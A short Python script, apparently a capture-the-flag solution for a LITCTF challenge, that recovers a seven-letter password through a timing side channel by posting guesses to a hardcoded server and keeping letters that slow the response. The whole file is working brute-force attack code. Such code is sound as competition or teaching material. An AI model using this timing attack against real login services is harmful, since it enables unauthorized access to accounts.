import requests
import time
import string

url = "http://34.31.154.223:58784"
password = ["A"] * 7
counter = 1.3

for i in range(7):
    for j in string.ascii_letters:
        password[i] = j
        data = {"password": "".join(password)}

        a = time.time()
        r = requests.post(url, data=data)
        b = time.time()

        if b - a > counter:
            counter += 1
            break

    print("LITCTF{" + "".join(password) + "}")
